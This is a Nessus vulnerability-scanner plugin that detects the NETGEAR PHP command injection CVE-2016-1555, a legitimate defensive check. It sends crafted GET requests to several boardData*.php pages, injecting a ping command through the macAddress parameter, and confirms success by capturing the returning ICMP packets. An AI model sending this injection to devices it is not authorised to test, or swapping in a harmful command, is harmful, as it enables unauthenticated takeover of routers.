#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(100321);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/05/24 13:36:52 $");

  script_cve_id("CVE-2016-1555");
  script_osvdb_id(135023);

  script_name(english:"NETGEAR Multiple Model PHP Remote Command Injection");
  script_summary(english:"Attempts to execute a command on the remote device.");

  script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by a remote command injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote NETGEAR device is affected by a remote command injection
vulnerability in multiple PHP scripts due to improper sanitization of
user-supplied input. An unauthenticated, remote attacker can exploit
this, via a specially crafted URL, to execute arbitrary commands on
the device.

Note that Nessus has detected this vulnerability by executing ping on
the remote device.");
  script_set_attribute(attribute:"see_also", value:"https://kb.netgear.com/30480/CVE-2016-1555-Notification");
  script_set_attribute(attribute:"solution", value:
"Apply the latest available firmware version according to the vendor
advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date",value:"2016/02/24");
  script_set_attribute(attribute:"patch_publication_date",value:"2017/01/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/05/22");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:wnap320_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:wndap350_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:wndap360_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:wndap210v2_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:wn604_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:wndap660_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:wn802tv2_firmware");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("netgear_www_detect.nbin");
  script_require_keys("installed_sw/Netgear WWW");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("http.inc");

get_install_count(app_name:"Netgear WWW", exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE, php:TRUE);
install = get_single_install(app_name:"Netgear WWW", port:port);

# This is a list of the affected URLs. Because there isn't consistency across devices
# we are forced to try them all.
urls = make_list('boardDataWW', 'boardDataNA', 'boardDataJP', 'boardData102', 'boardData103');

foreach(url in urls)
{
  exploit_url = '/' + url + '.php?writeData=lol&reginfo=0&macAddress=%20001122334455%20-c%205%20;ping%20-c15%20' + this_host() + ';';
  exploit = 'GET ' + exploit_url + ' HTTP/1.1\r\n' +
    'Host: ' + get_host_ip() + ':' + port + '\r\n' +
    'User-Agent: Nessus\r\n' +
    'Accept: text/html,application/xhtml+xml\r\n' +
    'Accept-Language: en-US,en;q=0.5\r\n' +
    'Accept-Encoding: gzip, deflate\r\n' + '\r\n';

  soc = open_sock_tcp(port);
  if (!soc)
  {
    # Don't try to continue since this is a big failure
    audit(AUDIT_SOCK_FAIL, port, "Netgear WWW");
  }

  filter = 'icmp and icmp[0] = 8 and src host ' + get_host_ip();
  response = send_capture(socket:soc, data:exploit, pcap_filter:filter);
  icmp = tolower(hexstr(get_icmp_element(icmp:response, element:"data")));
  close(soc);

  # No response, meaning we didn't get in
  if(isnull(icmp)) continue;

  report = '\nNessus was able to execute the command "ping -c 15 ' + this_host() +
    '" using the following request :\n\n' + build_url(qs:exploit_url, port:port) + '\n';
  security_report_v4(
    port:port,
    severity:SECURITY_HOLE,
    extra:report);
  exit(0);
}

audit(AUDIT_HOST_NOT, "an affected NETGEAR device");
